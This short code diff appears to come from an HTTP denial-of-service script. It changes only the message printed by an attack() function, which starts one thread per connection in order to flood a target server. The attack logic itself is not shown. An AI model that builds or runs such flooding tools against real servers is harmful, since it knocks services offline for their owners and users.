@@ -50,7 +50,7 @@ def getstatus():
 #     flag = f
 
 def attack():
-    print('\nStarting HTTPDoS attack...\n')
+    print('\n"Opening %s HTTP connections to DoS the target server"...\n' % threads)
     for i in range(1, threads+1):
         t = Thread(target=connect, args=(i,))
         t.start()
